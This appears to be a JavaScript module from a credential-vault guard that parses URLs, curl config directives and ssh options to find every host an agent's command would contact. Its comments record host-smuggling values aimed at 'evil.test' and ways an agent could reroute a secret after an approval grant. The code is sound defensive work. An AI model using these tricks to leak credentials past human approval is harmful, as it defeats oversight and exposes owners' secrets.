const GRAM_DEPTH = new WeakMap();   // round 7 (5b): the lead depth is the grammar's longest key (repo autolink create = 3 words), memoised per frozen grammar — never the constant row.sub (= 2, for blindSubs)
const gramDepthOf = (g) => { let d = GRAM_DEPTH.get(g); if (d === undefined) { d = Math.max(1, ...Object.keys(g).map((k) => k.split(' ').length)); GRAM_DEPTH.set(g, d); } return d; };
// round 7 (BLOCKER 2): a gh repository SPEC → the HOST gh resolves it to with go-gh's repository.Parse, or null for a default-host
// form. Wire-proven on gh 2.102.0 (GH_DEBUG=api): a scheme URL ssh|git|git+ssh|git+https|http|https://[user@]HOST[:port]/… ; the
// scp-like git@HOST:OWNER/REPO (go-gh's git.IsURL treats ONLY a git@ prefix as a URL — foo@HOST:… and HOST:OWNER/REPO are NOT
// hosts, they fall to the default host); and [HOST/]OWNER/REPO (3 slash-parts ⇒ HOST, 2 ⇒ default). '' = a host-bearing spec
// whose host is unreadable ⇒ the caller BLINDS; null = a default-host form.
const repoHostOf = (raw) => {
  const s = String(raw).trim();
  const strip = (h) => normHost(String(h).replace(/^www\./i, ''));   // round 8 (MINOR 2): go-gh's RepoInfoFromURL trims a leading www. (wire-proven on 2.102.0 for the URL, the scp-like AND the HOST/OWNER/REPO forms) — www.HOST targets HOST, so a value minted --for www.HOST must NOT silently pass
  if (/^(?:ssh|git\+ssh|git\+https|git|https?):\/\//i.test(s)) { const r = urlParse(s); return r.host ? (strip(r.host.replace(/:\d+$/, '')) || '') : ''; }   // round 19 (item 3): go-gh/Go url.Parse read the host after the LAST @ (ssh://x@ghe:1@evil.test → evil.test, not first-@ ghe); port dropped for the host identity; a userinfo http(s) spec is caught by url_userinfo
  let m = /^git@([^/:]+):/i.exec(s);
  if (m) return strip(m[1]) || '';
  const p = s.split('/');
  if (p.length >= 3) return strip(p[0]) || '';   // round 9 (BLOCKER): go-gh reads ANY 3-part first segment as the host and gh POSTs `Authorization: token …` there — a one-label `intranet/o/r` resolves on a search-domain network, an IPv6 literal `[fd00::1]/o/r` dials — so a 3-part spec host is read fail-CLOSED (the round-8 "looks like a host" gate that this reverts let a one-label / IPv6 host run ok:own with NO card). The REPO_DESC over-match that fed a mis-typed --branch here is fixed AT THE SOURCE (gen-gh-grammar.mjs REPO_NAME: --branch / --source-ref / --signer-workflow are NOT repoValues), so repoHostOf only ever sees a real spec
  return null;
};
/** The WHATWG host of one URL token (scheme://…). { host, userinfo } (userinfo:true = a credential-carrying URL, never an http(s)
 *  route) | { bad:true } (the WHATWG parser REJECTS the token: an out-of-range port, a non-DNS name, a label > 63 / a name > 253, an
 *  empty host, a `{{var}}`). The one authority on a URL's host — no regex reads it; a rejected token is a BLIND authority (bad_host),
 *  never a dropped host (Go/curl would still dial it). */
function urlParse(token) {
  const t = String(token);
  let u; try { u = new URL(t); } catch { return { bad: true }; }
  const i = t.indexOf('://');
  if (i >= 0) {
    const raw = /^[^/?#]*/.exec(t.slice(i + 3))[0];   // round 24: the authority the TOOL reads — to the first / ? #, NOT stopping at a `\` (that non-stop IS the divergence)
    if (AUTHORITY_UNSAFE.test(raw)) return { bad: true };   // round 24: a byte curl keeps but WHATWG strips / IDNA-maps / re-reads ⇒ the host cannot be told
    const at = raw.lastIndexOf('@'); let re;   // userinfo ends at the LAST @ (curl and WHATWG agree); re-parse the raw host-part ALONE and require new URL settled on the SAME host — both sides self-normalise case / a default port / a trailing dot, so this fires ONLY when the authority BOUNDARY moved (the `\@`, the un-decoded run WHATWG re-read elsewhere): a structural divergence, never a benign normalisation
    try { re = new URL(u.protocol + '//' + raw.slice(at + 1)); } catch { return { bad: true }; }
    if (re.host !== u.host) return { bad: true };
  }
  const h = normHost(u.hostname, u.port || null);   // the WHATWG host is read PAST the userinfo (`https://ghe'@evil.test` ⇒ evil.test), so a route still sees the real host
  return h ? { host: h, userinfo: u.username !== '' || u.password !== '' } : { bad: true };   // userinfo = a credential-carrying URL (url_userinfo, http/https only); a non-http scheme (postgresql://user@h, ssh://git@h) carries a legit username and its host is read
}
/** Every host a URL names, read by the WHATWG parser. A URI host LIST (round 2: `postgresql://a:1,b/db`, `redis://h1,h2`) is split
 *  on the authority's commas and each part is parsed on its own; a credential-carrying (userinfo) or unparseable token contributes
 *  no host here (url_userinfo / bad_host name it at the door). */
function urlHosts(text) {
  const out = []; let m; URL_FIND_RE.lastIndex = 0;
  while ((m = URL_FIND_RE.exec(String(text)))) {
    const scheme = m[1].toLowerCase(); if (scheme === 'vault') continue;
    const token = m[0].replace(URL_TRAIL, '');
    const auth = token.slice(scheme.length + 3).split(/[/?#]/)[0];
    for (const part of auth.split(',')) { const r = urlParse(`${scheme}://${part.trim()}/`); if (r.host) out.push(r.host); }
  }
  return out.filter(Boolean);
}
/** round 19 (item 1 BLOCKER): a located scheme://… token the WHATWG parser REJECTS (out-of-range port, non-DNS name, empty host,
 *  `{{var}}`) — a BLIND authority. On a ROUTE position (a gh <url>/<endpoint> positional) this must bad_host at the door, never be a
 *  dropped host: gh drops a bad port and still CONTACTS the host, so the token vanishing from routeHosts leaked the token to it. */
function urlHostsBad(text) {
  let m; URL_FIND_RE.lastIndex = 0;
  while ((m = URL_FIND_RE.exec(String(text)))) {
    const scheme = m[1].toLowerCase(); if (scheme === 'vault') continue;
    const token = m[0].replace(URL_TRAIL, '');
    const auth = token.slice(scheme.length + 3).split(/[/?#]/)[0];
    if (auth.split(',').some((part) => urlParse(`${scheme}://${part.trim()}/`).bad)) return true;
  }
  return false;
}
/** Does any http(s) URL token in the text carry userinfo (user[:pass]@host)? A credential-carrying URL is never a route — the door
 *  refuses url_userinfo. Scoped to http/https: ssh / git / ftp legitimately carry userinfo (a `git@` remote, an ftp login). */
function urlUserinfo(text) {
  let m; URL_FIND_RE.lastIndex = 0;
  while ((m = URL_FIND_RE.exec(String(text)))) { const s0 = m[1].toLowerCase(); if ((s0 === 'http' || s0 === 'https') && urlParse(m[0].replace(URL_TRAIL, '')).userinfo) return true; }
  return false;
}
/** lane vault-use-grants round 4 (BLOCKER), folded at int361 onto the ONE parser: a scheme://… token whose authority the tool
 *  may route elsewhere than any reader can tell (`\` before @, a %-escape, a space / control / non-ASCII byte — urlParse
 *  answers `bad` for that family, r24) makes the run's route OPAQUE (the card, no «Always»). Userinfo is urlParse's (url_userinfo). */
function urlOpaque(text) {
  let m; URL_FIND_RE.lastIndex = 0;
  while ((m = URL_FIND_RE.exec(String(text)))) { if (m[1].toLowerCase() === 'vault') continue; if (urlParse(m[0].replace(URL_TRAIL, '')).bad) return true; }
  return false;
}
// lane vault-agent-own (round 2) — the hosts the table did not read and the tool still goes to
const URL_AUTHORITY_RE = /\b([a-z][a-z0-9+.-]{0,31}):\/\/([^\/?#'"\t\n\r\f\v ]*)/gi;   // round 23 (the refuted finding): scheme through the authority, ending at `/?#'"` or ASCII whitespace ONLY — a non-ASCII whitespace (U+00A0/U+3000/…) stays in the authority so blindAuthority's non-ASCII test blinds it (JS's \s stopped the capture before it and read the host in front)
/** round 2b (HIGH-1): curl and wget percent-decode the host, IDNA-map a non-ASCII host and read userinfo PAST a backslash —
 *  so `good.com%2eevil.com`, `good.com。evil.com`, `good.com\@evil.com` all reach evil.com while URL_RE reads good.com. An
 *  authority that holds a `%`, a `\` or a non-ASCII byte cannot be trusted ⇒ the shape is BLIND (its real host is unknown). */
function blindAuthority(text) {
  let m; URL_AUTHORITY_RE.lastIndex = 0;
  while ((m = URL_AUTHORITY_RE.exec(String(text)))) if (m[1].toLowerCase() !== 'vault' && /[%\\]|[^\x00-\x7f]/.test(m[2])) return true;
  return false;
}
const BARE_RE = /^(?:[^\s@\/\\?#]*@)?(\[[0-9a-f:.]+\]|[A-Za-z0-9](?:[A-Za-z0-9.-]{0,251}[A-Za-z0-9])?)?(?::(\d{0,5}))?(?:[\/?#]\S*)?$/i;
/** A URL tool's target (curl / wget: every positional; httpie: its URL) → { host } (written without a scheme: `evil.example.com/x`,
 *  httpie's `:3000` = localhost) | { unread: true } (a target whose hosts the shape cannot list: curl's glob `{a,b}` / `[1-9]`, a
 *  bare number — an address too, `2130706433` = 127.0.0.1 —, a URL URL_RE cannot read) | {} (not a target: a header, a data word). */
function targetOf(a, globs = false, strict = false) {
  const s = String(a);
  if (globs && /[{}]|\[(?![0-9a-f:.]+\])/i.test(s)) return { unread: true };
  if (/^[a-z][a-z0-9+.-]{0,31}:\/\//i.test(s)) return urlHosts(s).length ? {} : { unread: true };
  if (/^[a-z][a-z0-9+.-]{0,31}:(?:\/|[a-z])/i.test(s)) return { unread: true };   // round 25 (item 2, refuted-but-real, wire-proven curl 8.18): a scheme-shaped token that is NOT canonical scheme:// — curl accepts http:/HOST (one slash) / http:HOST and dials a host PAST the scheme word; the reader never reads «http» as a bare host (BARE_RE did) ⇒ fail closed (unread/blind). A host:port (evil.test:8080) is not scheme-shaped — a digit, not a `/` or a letter, follows the colon
  const m = BARE_RE.exec(s);
  if (!m || (!m[1] && m[2] == null)) return strict ? { unread: true } : {};   // round 3: for a network tool (bareHosts:'all') a positional that is not a readable target is UNREAD (blind), never silently ignored — curl IDNA-maps / percent-decodes good.com。evil.com
  if (!m[1]) return { host: normHost('localhost', m[2] || null) };
  if (/^[\d.]+$/.test(m[1]) && !/^\d{1,3}(?:\.\d{1,3}){3}$/.test(m[1])) return { unread: true };
  return { host: normHost(m[1], m[2] || null) };
}
/** httpie: `http [METHOD] URL [items…]` — its one target. */
const httpieTarget = (ps) => (ps.length >= 2 && /^[A-Za-z]+$/.test(ps[0]) ? [ps[1]] : ps.slice(0, 1));
/** libpq's `host=` / `hostaddr=` (a connection string, `-d …`, a URI's `?host=`) → every host it names (a host LIST too). */
const CONNINFO_HOST = /(?:^|[\s?&=]|^-d)(?:host|hostaddr)\s*=\s*(?:'((?:[^'\\]|\\.)*)'|([^\s&'"]+))/gi;
function conninfoHosts(text) { const out = []; let m; CONNINFO_HOST.lastIndex = 0; while ((m = CONNINFO_HOST.exec(String(text)))) for (const h of String(m[1] != null ? m[1] : m[2]).split(',')) { const hh = h.trim(); if (/^(?:\/|%2f)/i.test(hh)) continue; out.push(normHost(hh)); } return out.filter(Boolean); }   // round 2b: a unix-socket path is local, not a network host
const CONNINFO_URI = /^postgres(?:ql)?:\/\/[^#]*/i;
function conninfoUriBlind(text) { const m = CONNINFO_URI.exec(String(text)); if (!m) return false; const q = m[0].indexOf('?'); return q >= 0 && m[0].slice(q).includes('%'); }   // round 3: a % in a conninfo URI's query = a libpq-decoded keyword (host / hostaddr / service) our reader cannot see
/** round 4: is a boolean flag present in its TRUE sense in any pflag spelling — the long form, --flag=true (not =false / =0),
 *  a short letter alone, a short letter inside a cluster of boolean letters (-dm / -md), or -x=true? gh's git-driving flags
 *  spell short aliases (pr merge --delete-branch / -d; repo create --clone / -c, --push). */
function boolFlagOn(argv, longs, shorts, grammar) {
  const valueShorts = new Set(((grammar && grammar.value) || []).filter((f) => /^-[A-Za-z]$/.test(f)));   // round 5: the verb's value-taking short flags, from the generated grammar
  const truthy = (val) => val == null || !/^(?:0|f|false)$/i.test(val);
  for (const a of argv.slice(1)) {
    if (a === '--') break;
    if (a.startsWith('--') && a.length > 2) { const eq = a.indexOf('='); if (longs.includes(eq > 0 ? a.slice(0, eq) : a) && truthy(eq > 0 ? a.slice(eq + 1) : null)) return true; }
    else if (a[0] === '-' && a.length > 1 && a[1] !== '-') {
      const eq = a.indexOf('='), letters = eq > 0 ? a.slice(1, eq) : a.slice(1), clVal = eq > 0 ? a.slice(eq + 1) : null;   // round 5: in a cluster, pflag binds `=value` to the LAST letter only
      for (let i = 0; i < letters.length; i++) {
        const sh = '-' + letters[i];
        if (valueShorts.has(sh)) break;   // a value short takes the REST of the cluster as its value — the later letters are not flags (pflag)
        if (shorts.includes(sh) && truthy(i === letters.length - 1 ? clVal : null)) return true;   // a boolean git-driving short: set true (NoOptDefVal) unless it is the LAST letter and carries =false/=0
      }
    }
  }
  return false;
}
/** round 4: a curl / wget FILE flag (--cacert / --cert / --netrc-file / --hsts …) escapes the config-file blind ONLY when its
 *  WHOLE value is a $VAULT_FILE{…} placeholder (for -E / --cert an optional :password after it — nothing else) whose entry the
 *  agent did NOT author: an owner-store entry. A template (--file NAME=@…, the agent's own text) or an agent-scoped entry (the
 *  agent put or minted the bytes) is the agent's own file ⇒ blind as any other config file; a $VAULT_FILE{…} inside a longer
 *  path (./x/$VAULT_FILE{o}/ca.pem, $VAULT_FILE{o}/../ca.pem) is not a whole placeholder ⇒ blind. ROUND 5 (say the reason): a
 *  MINTED own value is random printable text, never a usable cert / key / CA, so blinding it loses nothing legal — the exemption
 *  admits ONLY an owner-store entry, and an agent-scoped placeholder (put OR minted) blinds. */
function fileFlagExempt(f, v, run) {
  const re = f === '-E' || f === '--cert' ? /^\$VAULT_FILE\{([^}]*)\}(?::.*)?$/ : /^\$VAULT_FILE\{([^}]*)\}$/;
  const m = re.exec(String(v));
  if (!m) return false;
  const inner = m[1];
  if (ENV_NAME.test(inner)) { const file = run.files.find((x) => x.name === inner); return !!file && file.template == null && file.ref != null && !agentScopeOf(parseRef(file.ref)); }
  return !agentScopeOf(innerRef(inner));
}
/** round 17 (item 1): a config-file flag value the card renders IN FULL — a whole $VAULT_FILE{NAME} placeholder naming a
 *  `--file NAME=@template` (the agent's own text, shown verbatim on the card) within the card render bound. A
 *  $VAULT_FILE{store/row/field} (an owner-secret FILE, its bytes never shown), an opaque path, or a template past the
 *  render bound is NOT shown ⇒ no «always» (the card cannot show what the tool reads). */
function configTemplateShown(v, run) {
  const m = /^\$VAULT_FILE\{([^}]*)\}$/.exec(String(v));
  if (!m || !ENV_NAME.test(m[1])) return false;
  const file = run.files.find((x) => x.name === m[1]);
  return !!file && file.template != null && typeof file.text === 'string' && bytesOf(file.text) <= TEMPLATE_CARD_MAX;
}
/** round 18 (item 3): a curl config TEMPLATE the card shows in full can itself NEST another file — `config = "./b.cfg"`, or a
 *  cacert / cert / key / netrc-file / alt-svc / cookie-jar / upload-file / data(@file) / output directive. The agent can rewrite
 *  that nested file AFTER an «always» grant and route the value to a new host with no card. The template's own directives are
 *  parsed for the row's declared file-reading keys; the FIRST one that names a file (or an @file) the card cannot show is
 *  returned as `key value` (so the card names it). A curl config line is `[--]key[ =:]value`, `#` comments, quotes optional. */
/** round 19 (item 4): curl's OWN config-file grammar (src/tool_parsecfg.c), pinned by the table test in test-vault-run §parseCfgLine:
 *  skip leading whitespace; a line whose first non-space char is `#` is a comment; the option word runs to whitespace / `=` / `:`
 *  (an optional leading `-`/`--` is stripped); one `=`/`:`/whitespace separates it from the parameter; a `"`-quoted parameter is read
 *  with curl's escapes (\\, \", \t, \n, \r, \v) to the closing quote (the rest of the line — e.g. a trailing `# comment` — is
 *  discarded); an unquoted parameter is the rest of the line, trailing whitespace trimmed. A single-letter option is case-SENSITIVE
 *  (-K config vs -k insecure); a long option is matched case-insensitively (fail-closed). */
function parseCfgLine(raw) {
  const s = String(raw).replace(/^\uFEFF/, '');
  let i = 0; while (i < s.length && /\s/.test(s[i])) i++;
  if (i >= s.length || s[i] === '#') return { key: null, val: '' };
  let j = i; while (j < s.length && !/\s/.test(s[j]) && s[j] !== '=' && s[j] !== ':') j++;
  const key = s.slice(i, j).replace(/^-+/, '');
  if (!key) return { key: null, val: '' };
  while (j < s.length && /\s/.test(s[j])) j++;
  if (s[j] === '=' || s[j] === ':') j++;
  while (j < s.length && /\s/.test(s[j])) j++;
  if (s[j] === '"') { let out = ''; j++; while (j < s.length && s[j] !== '"') { if (s[j] === '\\' && j + 1 < s.length) { const c = s[++j]; out += ({ n: '\n', t: '\t', r: '\r', v: '\v' })[c] || c; } else out += s[j]; j++; } return { key, val: out }; }
  return { key, val: s.slice(j).replace(/\s+$/, '') };
}
/** a scheme-less (`evil.test/x`) or scheme (`https://evil.test/x`) URL value → its host(s); userinfo stripped. */
function cfgBareOrUrl(v) {
  const t = String(v).trim();
  if (/^[a-z][a-z0-9+.-]{0,31}:\/\//i.test(t)) return urlHosts(t);
  if (/^[a-z][a-z0-9+.-]{0,31}:(?:\/|[a-z])/i.test(t)) return [];   // round 25 (item 2): a scheme-shaped token that is not canonical scheme:// (http:/host, http:host) — the config twin of the argv hole; curl dials a host past the scheme, the reader never reads «http» as a bare host (cfgRouteHosts then blinds)
  const hp = t.split(/[\/?#]/)[0].replace(/^[^@]*@/, '');
  const h = AUTHORITY_UNSAFE.test(hp) ? null : normHost(hp);   // round 24: a `\` / % / space / non-ASCII in a scheme-less config host ⇒ blind (the same law urlParse keeps for scheme URLs)
  return h ? [h] : [];
}
// round 25 (item 1, CONFIRMED 0.93): a route host token ([scheme://][user@]host[:port], cut at the first / ? # as curl does) read by the ONE parser (urlParse) — curl's host WITHOUT its port, or null (blind). No hand regex reads a route host any more: the old proxy / preproxy / socks branch read the host after the LAST @ and ignored #/? (`proxy = evil.test#@own.example:3128` named own.example while the real curl dialled evil.test — wire-proven on a loopback proxy, curl 8.18).
function routeHostOne(raw) {
  const t = String(raw).trim();
  if (!t) return null;
  if (/^[a-z][a-z0-9+.-]{0,31}:(?:\/|[a-z])/i.test(t) && !/^[a-z][a-z0-9+.-]{0,31}:\/\//i.test(t)) return null;   // round 26 (MAJOR 2a, confirmed, wire-proven curl 8.18): the r25 scheme-word rule was in targetOf / cfgBareOrUrl but NOT here — a scheme-shaped token that is not canonical scheme:// (proxy = http:/HOST one-slash, socks5:/HOST) dials a host PAST the scheme word; the reader never reads «http» / «socks5» as a bare route host ⇒ blind (fail closed). A host:port (evil.test:3128 — a digit after the colon) is not scheme-shaped and is read
  const r = urlParse(/^[a-z][a-z0-9+.-]{0,31}:\/\//i.test(t) ? t : 'http://' + t);
  return r.host ? r.host.replace(/:\d+$/, '') : null;   // the host without its port (a proxy / socks / resolve host is named; a port is not a host); an IPv6 literal stays bracketed ([::1])
}
// round 26 (MAJOR 2b): a --resolve ADDR is an IP literal curl DIALS (IPv4, or IPv6 bracketed [::1] or BARE ::1) — never a URL host. A bare v6 is bracketed so the ONE parser (urlParse) reads it; it is NEVER dropped (the r23 law: a non-empty route token the parser rejects BLINDS the directive, it is not silently dropped — curl would still dial it).
function routeAddrOne(raw) {
  const t = String(raw).trim();
  if (!t) return null;
  const bare6 = t.indexOf(':') >= 0 && t[0] !== '[';   // a bare IPv6 literal (holds a colon, not already bracketed) — WHATWG requires brackets
  return routeHostOne(bare6 ? `[${t}]` : t);
}
// a connect-to / resolve field string split on ':' but NOT inside [ ] (an IPv6 literal `[::1]` holds colons)
function colonFields(s) {
  const out = []; let cur = '', depth = 0;
  for (const ch of String(s)) {
    if (ch === '[') { depth++; cur += ch; } else if (ch === ']') { depth = Math.max(0, depth - 1); cur += ch; }
    else if (ch === ':' && depth === 0) { out.push(cur); cur = ''; } else cur += ch;
  }
  out.push(cur); return out;
}
/** a curl route directive's value → { hosts } | { blind:true } (a {{var}} host, a socket, an unparseable / unsafe authority) | { file:true } (url = @file). EVERY route value is read by the ONE parser (routeHostOne → urlParse), with a bracket-aware field split for the colon forms — no hand regex. */
function cfgRouteHosts(key, v) {
  const t = String(v).trim();
  if (!t) return { hosts: [] };
  if (/\{\{|\}\}/.test(t)) return { blind: true };
  if (key === 'unix-socket' || key === 'abstract-unix-socket') return { blind: true };   // round 23 (MAJOR): a local socket path routes the connection off every named host and cannot be named — BLIND (named, «always» withheld), the same law argv's --unix-socket blinds
  if (key !== 'url' && key !== 'doh-url' && key !== 'ipfs-gateway' && AUTHORITY_UNSAFE.test(t)) return { blind: true };   // round 24: a byte curl keeps but the parser reads differently, anywhere in a colon form ⇒ blind (url / doh-url / ipfs-gateway route through cfgBareOrUrl → urlParse, which keeps the law per token)
  let hosts;
  if (key === 'url') { if (t[0] === '@') return { file: true }; hosts = cfgBareOrUrl(t); }
  else if (key === 'doh-url' || key === 'ipfs-gateway') hosts = cfgBareOrUrl(t);
  else if (key === 'connect-to') { const f = colonFields(t); const h = f.length >= 3 ? routeHostOne(f[2]) : null; hosts = h ? [h] : []; }   // HOST1:PORT1:HOST2:PORT2 — curl connects to HOST2 (bracket-aware so an IPv6 [::1] host is not split, and read by the ONE parser)
  else if (key === 'resolve') { const f = colonFields(t.replace(/^\+/, '')); const h = f[0] ? routeHostOne(f[0]) : null; const raw = f.slice(2).join(':').split(',').map((a) => a.trim()).filter((a) => a !== ''); const addrs = raw.map((a) => routeAddrOne(a)); if (addrs.some((a) => !a)) return { blind: true }; hosts = [h, ...addrs].filter(Boolean); }   // round 26 (MAJOR 2b): [+]HOST:PORT:ADDR[,ADDR] — the mapped host + its address(es); each ADDR is an IP literal read by routeAddrOne (a BARE IPv6 ::1 bracketed first, never dropped), and a non-empty ADDR the parser rejects BLINDS (curl still dials it), it is not filtered away
  else { const h = routeHostOne(t); hosts = h ? [h] : []; }   // proxy / preproxy / proxy1.0 / socks* / dns-servers: [protocol://][user@]host[:port] read exactly as curl reads it (#/? end the authority; a `\` / userinfo-past / unsafe byte blinds)
  return hosts.length ? { hosts } : { blind: true };   // round 23 (reopens r19 item 1): a NON-empty route token whose host the parser REJECTS is a BLIND authority — named, «always» withheld, never a DROPPED host (curl would still dial it)
}
/** round 18/19 (item 3/4): a curl config TEMPLATE the card shows in full can NEST another agent-writable file, ROUTE the connection
 *  off the URL's host, REDIRECT, or make the destination at run time. Parsed with curl's own grammar (parseCfgLine). Returns
 *  { reads: 'key value'|null (the FIRST directive that reads/writes a file, routes, redirects or expands — «always» withheld, named),
 *  hosts: [the route hosts the template names, added to the Hosts line], blind: bool (a {{var}} / opaque route — the destination is
 *  unknowable) }. The row's category sets are DERIVED from `curl --help all` and pinned by the census (test-vault-run-model). */
function configNestedFile(text, row) {
  const short = row.configShort || {};
  const S = (list) => new Set(list || []);
  const fileK = S(row.configFileKeys), dataK = S(row.configDataKeys), atNameK = S(row.configAtNameKeys), cookieK = S(row.configCookieKeys),
    netrcK = S(row.configNetrcKeys), routeK = S(row.configRouteKeys), redirK = S(row.configRedirectKeys), formK = S(row.configFormKeys), expand = row.configExpandPrefix || null;
  if (![fileK, dataK, atNameK, cookieK, netrcK, routeK, redirK, formK].some((x) => x.size) && !expand) return { reads: null, hosts: [], blind: false };
  let reads = null, blind = false; const hostsOut = [];
  const name = (k, v) => { if (!reads) reads = v ? `${k} ${v}` : k; };
  for (const raw of String(text).split(/\r?\n/)) {
    const { key, val } = parseCfgLine(raw);
    if (key == null) continue;
    const canon = key.length === 1 ? (short[key] || key) : key.toLowerCase();
    if (expand && canon.startsWith(expand)) { blind = true; name(canon, val); continue; }
    if (netrcK.has(canon)) { name(canon, ''); continue; }   // --netrc reads ~/.netrc, a file this card cannot show
    if (redirK.has(canon)) { name(canon, val); continue; }   // --location / --proto-redir: the redirect destination is the server's choice
    if (routeK.has(canon)) { const r = cfgRouteHosts(canon, val); if (r.blind) { blind = true; name(canon, val); } else if (r.file) { name(canon, val); } else if (r.hosts && r.hosts.length) { hostsOut.push(...r.hosts); name(canon, val); } continue; }
    if (!val) continue;
    if (fileK.has(canon)) { name(canon, val); continue; }
    if (dataK.has(canon) && val[0] === '@' && val !== '@-') { name(canon, val); continue; }   // --data/--header @file reads a file; inline / @- (stdin) / --data-raw do not
    if (atNameK.has(canon)) { const at = val.indexOf('@'); if (at >= 0 && !val.slice(0, at).includes('=') && val.slice(at + 1) && val.slice(at + 1) !== '-') { name(canon, val); continue; } }   // --variable name@file / --data-urlencode name@file (the @ is not after a `=`)
    if (cookieK.has(canon) && !val.includes('=')) { name(canon, val); continue; }   // curl -b: a value with `=` is inline cookie data, without it a filename
    if (formK.has(canon) && /=[@<]/.test(val)) { name(canon, val); continue; }   // -F field=@file (upload) / field=<file (read content)
  }
  return { reads, hosts: hostsOut.filter(Boolean), blind };
}
/** getopt's short-flag cluster: the first letter that takes a value takes the rest of the word (`-hHOST`, `-sSo out`) or the next word. */
function shortSplit(a, takes) { for (let i = 1; i < a.length; i++) { const f = '-' + a[i]; if (takes.includes(f)) { let v = i + 1 < a.length ? a.slice(i + 1) : null; if (v && v[0] === '=') v = v.slice(1); return { f, head: a.slice(0, i + 1), v }; } } return null; }   // round 2b: `-s=https://…` (Go flags) drops the `=`
const HOSTNAME = /^(?:[a-z0-9](?:[a-z0-9-]{0,61}[a-z0-9])?\.)+[a-z]{2,63}$|^localhost$/i;

// ── THE RUN'S DESTINATIONS (lane vault-use-grants round 2 BLOCKER, round 3 completes it) — THE SEAM ──
// `shape.hosts` is what the card NAMES (every URL / host-flag / scp target / default). Where the value actually GOES is a
// wider question: curl's routing flags (-x/--proxy/--proxy1.0/--connect-to/--resolve/--socks*), ssh's -o ProxyCommand /
// LocalCommand / -J / -W, git's -c, rsync's -e, wget's -e http_proxy=, a bare positional (curl localhost:9999/x), a numeric
// address (2130706433), a unix socket, an ssh config alias, and a proxy env var all send it to a host that never enters
// `shape.hosts`. `routeTargetsOf` reads those too (the SAME reader a card and a grant share); it returns `opaque:true` when a
// routing input cannot be resolved to a concrete host (ProxyCommand, a unix socket, a non-dotted-quad numeric address, a
// proxy env var, a config alias) — the door then asks (fail closed). Attached short values (`-xHOST`, `-oProxyCommand=…`)
// are read by shapeOf's getopt (`shortSplit`), so they reach `keyed` here.
// INTEGRATION SEAM: vault-agent-own r19 builds a LOCAL `const routeHosts = new Set()` inside its shapeOf and emits a
// `shape.routeHosts` field (gh's routing inputs). This lane emits the SAME field `shape.routeHosts` + `routeOpaque`, but its
// builder is a MODULE function — named `routeTargetsOf` (round 3 MINOR) so the merge cannot silently keep r19's local Set in
// place of this reader. At train-C the two fold into ONE `shape.routeHosts`/`routeOpaque`; `destinationsOf` reads the field.
// See docs/kb-bugfix-invariants.md «### Round 3 — As-built integration note».
// lane vault-use-grants round 7 (MAJOR item 1): ONE table of ssh's (short flag ↔ long `-o` keyword), so the `-o` reader and
// the short-flag reader are DERIVED from the SAME rows and can never disagree — a spelling opaque in one is opaque in both.
// `mode:'opaque'` = a forward / control socket (where the bytes go cannot be told ⇒ fail closed); `mode:'host'` = it names a
// destination the alias law reads. The oracle is `ssh -F /dev/null -G`: it prints the SAME normalized keyword for a flag and
// its `-o` long form (`-S x` ≡ `-o ControlPath=x` ⇒ `controlpath x`; `-L …` ≡ `-o LocalForward=…`; `-J r` ≡ `-o ProxyJump=r`);
// the census leg (test-vault-run-model) walks every short flag the reader marks and asserts its long row is here.
const SSH_OPT_TABLE = Object.freeze([
  { flag: '-S', o: 'controlpath', mode: 'opaque' },     // a multiplex master's socket — the run rides an existing session
  { flag: '-L', o: 'localforward', mode: 'opaque' },    // local→remote forward — redirects where it goes
  { flag: '-R', o: 'remoteforward', mode: 'opaque' },   // remote→local forward
  { flag: '-D', o: 'dynamicforward', mode: 'opaque' },  // a SOCKS proxy — any destination
  { flag: '-J', o: 'proxyjump', mode: 'host' },         // a jump host — an alias like any other (addSshHost)
]);
const SSH_OPAQUE_O = SSH_OPT_TABLE.filter((r) => r.mode === 'opaque').map((r) => r.o);
const SSH_OPAQUE_FLAGS = new Set(SSH_OPT_TABLE.filter((r) => r.mode === 'opaque').map((r) => r.flag));   // ssh -S/-L/-R/-D — DERIVED from the table above, never a hand-kept second copy
const SSH_LOCAL_O = new Set([...SSH_OPAQUE_O, 'proxycommand', 'localcommand', 'knownhostscommand', 'permitlocalcommand', 'match']);   // ssh -o keys that redirect / run a LOCAL command — the forward long forms (controlpath/localforward/remoteforward/dynamicforward) are the table's opaque rows, so `-o ControlPath=` is opaque exactly as `-S` is
// lane vault-use-grants round 6 (BLOCKER item 1): the `-o` keys whose VALUE is a host the ssh family resolves through
// ~/.ssh/config (from `ssh -G`'s keywords) — subject to the alias law, read by the ONE reader `addSshHost`. `-J` and `-W`
// are short spellings of the same destination family (`ssh -G -J router` prints `proxyjump router`, identical to
// `-o ProxyJump=router`). A missed spelling is a missing ROW here (or a short flag routed to addSshHost), never a branch
// that forgot the alias check — so a single-label jump host can no longer slip past with `always:true`.
const SSH_HOST_OPTS = new Set([...SSH_OPT_TABLE.filter((r) => r.mode === 'host').map((r) => r.o), 'hostname']);
// lane vault-use-grants round 11 (MAJOR): `-o` keywords that change the destination or load code the reader cannot vouch for.
// CanonicalDomains / CanonicalizeHostname rewrite the connect host through a domain LIST the reader cannot resolve (a grant
// names the pre-canonical host, ssh dials the post-canonical one). PKCS11Provider / SecurityKeyProvider name a shared library
// (.so) ssh dlopen()s with the staged secret in the child's environment — code the agent can write. Both ⇒ OPAQUE (the card,
// «always» withheld), never read as «no option». The command-line `-I` (PKCS11 identity) is the same class — handled in
// routeTargetsOf (it is a flag, not an `-o` keyword). Pinned vs `ssh -F /dev/null -G` in the oracle.
const SSH_OPAQUE_KW = new Set(['canonicaldomains', 'canonicalizehostname', 'pkcs11provider', 'securitykeyprovider']);
// lane vault-use-grants round 9 (BLOCKER item 2): read an `ssh -o <string>` keyword the way OpenSSH's strdelim (readconf.c)
// does — NOT a bare cut at the first `=`/space. ssh: a token ends at unquoted whitespace OR a single `=`; a `"` begins a run
// whose bytes (incl. ws and `=`) are literal and whose quotes are STRIPPED (around the keyword AND inside it: `Host"Name"` =
// `HostName`); a leading `=` (or leading ws) is an EMPTY first token it skips ONCE to read the real keyword; a SECOND empty
// token (`==HostName=`) ⇒ ssh ignores the line (no option). We reproduce that, verified against `ssh -F /dev/null -G` for
// every spelling in the suite's oracle table. Anything strdelim would reject (an unmatched quote), a control char inside the
// keyword/value, or a HostName/ProxyJump value we cannot resolve to a literal host (a `%` token ssh expands) ⇒ OPAQUE (fail
// closed): the keyword is not in a table we read with certainty, so the card is drawn and «always» withheld.
const SSH_OPT_WS = ' \t\r\n\f';
